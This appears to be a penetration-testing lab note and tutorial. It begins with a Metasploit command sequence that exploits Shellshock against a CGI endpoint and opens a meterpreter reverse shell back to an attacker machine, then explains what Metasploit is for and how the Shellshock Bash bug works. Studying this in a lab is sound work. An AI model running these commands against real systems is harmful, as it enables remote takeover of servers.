meta:
use exploit/multi/http/apache_mode_cgi_bash_env_exec
set LHOST 192.168.0.133 (ip of kali)
set RHOST 192.168.0.109
set TARGETURI /cgi-bin/status
set payload linux/x86/meterpreter/reverse_tcp
exploit

Type help to View the help on the meterpreter commands
Type arp to view the ARP cache
 "ipconfig" and press enter to view the IP configuration
 
 Metasploit is the world’s leading open-source penetrating framework used by security engineers as a penetration testing system and a development platform that allows to create security tools and exploits. The framework makes hacking simple for both attackers and defenders. 

The various tools, libraries, user interfaces, and modules of Metasploit allow a user to configure an exploit module, pair with a payload, point at a target, and launch at the target system. Metasploit’s large and extensive database houses hundreds of exploits and several payload options.

A Metasploit penetration test begins with the information gathering phase, wherein Matsploit integrates with various reconnaissance tools like Nmap, SNMP scanning, and Windows patch enumeration, and Nessus to find the vulnerable spot in your system. Once the weakness is identified, choose an exploit and payload to penetrate the chink in the armor. If the exploit is successful, the payload gets executed at the target, and the user gets a shell to interact with the payload. One of the most popular payloads to attack Windows systems is Meterpreter – an in-memory-only interactive shell. Once on the target machine, Metasploit offers various exploitation tools for privilege escalation, packet sniffing, pass the hash, keyloggers, screen capture, plus pivoting tools. Users can also set up a persistent backdoor if the target machine gets rebooted. 

The extensive features available in Metasploit are modular and extensible, making it easy to configure as per every user requirement.  

What Is the Purpose of Metasploit?
Metasploit is a powerful tool used by network security professionals to do penetration tests, by system administrators to test patch installations, by product vendors to implement regression testing, and by security engineers across industries. The purpose of Metasploit is to help users identify where they are most likely to face attacks by hackers and proactively mend those weaknesses before exploitation by hackers. 

Who Uses Metasploit?
With the wide range of applications and open-source availability that Metasploit offers, the framework is used by professionals in development, security, and operations to hackers. The framework is popular with hackers and easily available, making it an easy to install, reliable tool for security professionals to be familiar with even if they don’t need to use it. 

Metasploit Uses and Benefits
Metasploit provides you with varied use cases, and its benefits include:

Open Source and Actively Developed – Metasploit is preferred to other highly paid penetration testing tools because it allows accessing its source code and adding specific custom modules. 
Ease of Use – it is easy to use Metasploit while conducting a large network penetration test. Metasploit conducts automated tests on all systems in order to exploit the vulnerability. 
Easy Switching Between Payloads – the set payload command allows easy, quick access to switch payloads. It becomes easy to change the meterpreter or shell-based access into a specific operation. 
Cleaner Exits – Metasploit allows a clean exit from the target system it has compromised.
Friendly GUI Environment – friendly GUI and third-party interfaces facilitate the penetrate testing project.

Shellshock is a critical vulnerability due to the escalated privileges afforded to attackers, which allow them to compromise systems at will. Although the ShellShock vulnerability, CVE-2014-6271, was discovered in 2014, it is known to still exist on a large number of servers in the world. The vulnerability was updated (CVE-2014-7169) soon after and has been modified up until 2018. 

The main reason Shellshock is still in use is no shocker. This vulnerability is a simple and inexpensive attack bad actors can deploy against an unknowing target. Patches have been available since the CVE entry, but any organization without proper patch management systems in place may still be vulnerable.

Shellshock was still prominent in 2017. When all attackers need are some basic programming skills, a server and access to malware, it’s not surprising. Plus, the cost to carry out an attack isn’t much more than a few dollars per month. The math is in the attackers’ favor. Minimal knowledge, little effort and low cost equals one easy hacking strategy.

Despite all the extensive cybersecurity media coverage and even a Department of Homeland Security alert, some systems remain unpatched. In one example, officials at the Center for Election Systems failed to apply a patch that compromised the Georgia elections systems.

In layman’s terms, Shellshock is a vulnerability that allows systems containing a vulnerable version of Bash to be exploited to execute commands with higher privileges. This allows attackers to potentially take over that system.

Diving deeper into the technical, Shellshock is a security bug in the Bash shell (GNU Bash up to version 4.3) that causes Bash to execute unintentional bash commands from environment variables. Threat actors exploiting the vulnerability can issue commands remotely on the target host. While Bash is not inherently Internet-facing, many internal and external services such as web servers do use environment variables to communicate with the server’s operating system. 

If those data inputs are not sanitized — the coding standard process that ensures that code is not part of the input — before execution, attackers may launch HTTP request commands executed via the Bash shell.
